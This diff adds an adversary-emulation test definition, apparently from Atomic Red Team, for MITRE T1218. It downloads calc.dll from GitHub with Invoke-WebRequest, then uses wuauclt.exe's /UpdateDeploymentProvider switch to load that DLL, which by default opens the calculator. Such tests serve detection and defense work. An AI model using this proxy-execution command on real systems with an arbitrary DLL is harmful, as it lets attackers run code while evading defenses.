@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Load Arbitrary DLL via Wuauclt (Windows Update Client)
+description: "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n"
+args:
+    - name: arbitrary_dll
+      type: string
+      default: PathToAtomicsFolder\T1218\bin\calc.dll
+uuid: 49fbd548-49e9-4bb7-94a6-3769613912b8
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        DLL to load must exist on disk as specified location (#{arbitrary_dll})
+      inline: |
+        if (test-path "#{arbitrary_dll}"){exit 0} else {{New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
+        }}
+      executor: powershell
+    - name: load-arbitrary-dll-via-wuauclt-(windows-update-client)
+      inline: |
+        wuauclt.exe /UpdateDeploymentProvider "{{.Args.arbitrary_dll}}" /RunHandlerComServer
+      executor: command_prompt
+      cleanup:
+        inline: taskkill /f /im calculator.exe > nul 2>&1
+        executor: command_prompt
